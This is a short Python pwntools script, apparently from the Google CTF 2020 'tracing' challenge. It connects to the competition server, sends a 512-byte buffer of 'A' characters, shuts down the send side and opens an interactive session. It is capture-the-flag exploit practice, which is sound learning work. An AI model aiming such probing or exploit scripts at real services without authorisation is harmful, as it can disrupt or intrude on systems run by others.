from pwn import *

context.log_level = "debug"

p = remote("tracing.2020.ctfcompetition.com", 1337)

p.send("A" * 0x10 * 0x20)

p.shutdown("send")

p.interactive()
